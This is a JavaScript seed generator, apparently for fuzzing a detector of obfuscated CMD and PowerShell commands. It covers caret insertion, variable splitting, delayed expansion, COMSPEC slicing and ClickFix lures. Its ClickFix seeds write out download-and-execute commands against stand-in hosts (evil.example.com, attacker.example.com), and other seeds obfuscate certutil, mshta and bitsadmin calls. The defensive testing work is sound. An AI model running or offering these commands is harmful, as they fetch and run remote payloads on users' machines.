'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/cmd-grammar.js — deterministic seed generator for CMD + PowerShell
// obfuscation (the cmd-obfuscation.js + ps-mini-evaluator.js surfaces).
//
// The `cmd-obfuscation.js` finder emits both CMD-flavoured and PowerShell-
// flavoured candidates — the two interleave in real droppers and the post-
// processor treats them uniformly. The separate `powershell-obfuscation`
// target exists so the per-technique table can attribute PowerShell hits
// cleanly; this module covers the CMD surface only (plus the ClickFix
// wrapper, which is CMD-shaped).
//
// Each seed is a Buffer whose `_expectedSubstring` (attached via
// `makeSeed`) names a token that MUST appear in the decoder's
// `candidate.deobfuscated` output. The fuzz target asserts presence as a
// soft counter — a regression in decoding surfaces as `expectedMiss++`
// on the per-technique JSONL dump, not as a hard crash.
// ════════════════════════════════════════════════════════════════════════════

const CMD_TECHNIQUE_CATALOG = Object.freeze([
  'CMD Caret Insertion',
  'CMD Caret Insertion (nested)',
  'CMD Variable Concatenation',
  'CMD Delayed-Expansion Indirection',
  'CMD Env Var Substring (inline)',
  'CMD Env Var (argv0)',
  'CMD ClickFix Wrapper',
]);

// Tiny xorshift32 PRNG — deterministic per seed, no Math.random.
function makeRng(seed) {
  let s = (seed | 0) || 0xC1D5EED0;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ──────────────────────────────────────────────────────
// Keep each one small; variety comes from parameter sweeps, not branch logic.

function genCaretInsertion(rng) {
  // Inject carets between letters of a sensitive keyword. Count varies
  // so nested (`^^`) and simple (`^`) both fire.
  const keywords = ['powershell', 'whoami', 'certutil', 'rundll32', 'mshta', 'regsvr32', 'bitsadmin'];
  const out = [];
  for (const kw of keywords) {
    // Simple caret insertion
    const letters = kw.split('');
    const withCarets = letters.join('^');
    out.push(makeSeed(`cmd /c ${withCarets} -Command "Get-Process"`, kw));
    // Nested double-caret form (for /f indirection)
    const doubled = letters.join('^^');
    out.push(makeSeed(`for /f "delims=" %X in ('echo ${doubled}') do %X`, kw));
    // Variable prefix/suffix carets
    const carets = '^'.repeat(1 + rng.int(3));
    out.push(makeSeed(`echo ${carets}${withCarets}${carets} args`, kw));
  }
  return out;
}

function genVariableConcat(rng) {
  // set a=pow & set b=ershell & %a%%b% - the canonical CMD var-split.
  const out = [];
  const targets = ['powershell', 'whoami', 'calc.exe', 'netstat'];
  for (const tgt of targets) {
    const splits = [];
    // Split the target into 2-4 pieces at random boundaries
    const pieces = 2 + rng.int(3);
    const positions = [];
    for (let i = 1; i < pieces; i++) positions.push(1 + rng.int(tgt.length - 1));
    positions.sort((a, b) => a - b);
    positions.unshift(0);
    positions.push(tgt.length);
    const parts = [];
    for (let i = 0; i < positions.length - 1; i++) {
      parts.push(tgt.slice(positions[i], positions[i + 1]));
    }
    const names = parts.map((_, i) => `v${i}`);
    for (let i = 0; i < parts.length; i++) {
      splits.push(`set ${names[i]}=${parts[i]}`);
    }
    const invoke = names.map(n => `%${n}%`).join('');
    out.push(makeSeed(splits.join('&&') + ' && ' + invoke, tgt));
  }
  return out;
}

function genDelayedExpansion() {
  // setlocal enabledelayedexpansion + !var! indirection.
  return [
    makeSeed(
      'setlocal enabledelayedexpansion\nset x=powershell\n!x! -Command "whoami"',
      'powershell',
    ),
    makeSeed(
      'setlocal enabledelayedexpansion & set cmd=calc.exe & !cmd!',
      'calc.exe',
    ),
  ];
}

function genEnvVarSubstring() {
  // %COMSPEC:~N,M% — slice known env vars to reconstruct "cmd". The
  // decoder's KNOWN_ENV_VARS table maps COMSPEC → 'C:\\Windows\\System32\\cmd.exe';
  // indices 24..3 reconstruct "cmd".
  const out = [];
  // Slice out "cmd" from COMSPEC (at offset 24, length 3).
  out.push(makeSeed('%COMSPEC:~24,3% /c whoami', 'cmd'));
  // Slice out ".exe"
  out.push(makeSeed('echo %COMSPEC:~-4%', '.exe'));
  // Slice "System" from COMSPEC
  out.push(makeSeed('%COMSPEC:~11,6%', 'System'));
  // Combined several slices
  out.push(makeSeed(
    'set f=%COMSPEC:~24,3%%COMSPEC:~24,1%',
    'cmdc',
  ));
  return out;
}

function genArgv0() {
  // %~0 / %0 in a batch file — expands to the full invocation path. The
  // finder surfaces it as "CMD Env Var (argv0)".
  return [
    makeSeed('call "%~f0" --payload', '%~f0'),
    makeSeed('%~nx0 /k whoami', '%~nx0'),
  ];
}

function genClickFix() {
  // ClickFix = "Run dialog" social-engineering wrapper: user is told
  // to paste a line into Win+R. The finder looks for the explain-me
  // phrase + a trailing powershell/cmd payload. The technique surfaces
  // as critical — see cmd-obfuscation.js:678.
  return [
    makeSeed(
      '# Press Win+R then paste the following and press Enter\n'
      + 'powershell -Command "IEX(IWR https://evil.example.com/p.ps1)"',
      'powershell',
    ),
    makeSeed(
      'Copy this command and paste into Windows Run dialog:\n'
      + 'cmd /c curl http://attacker.example.com/x -o %TEMP%\\x.exe && %TEMP%\\x.exe',
      'curl',
    ),
  ];
}

function generateCmdSeeds() {
  const rng = makeRng(0xC1D5EED0);
  return [
    ...genCaretInsertion(rng),
    ...genVariableConcat(rng),
    ...genDelayedExpansion(),
    ...genEnvVarSubstring(),
    ...genArgv0(),
    ...genClickFix(),
  ];
}

module.exports = { generateCmdSeeds, CMD_TECHNIQUE_CATALOG };
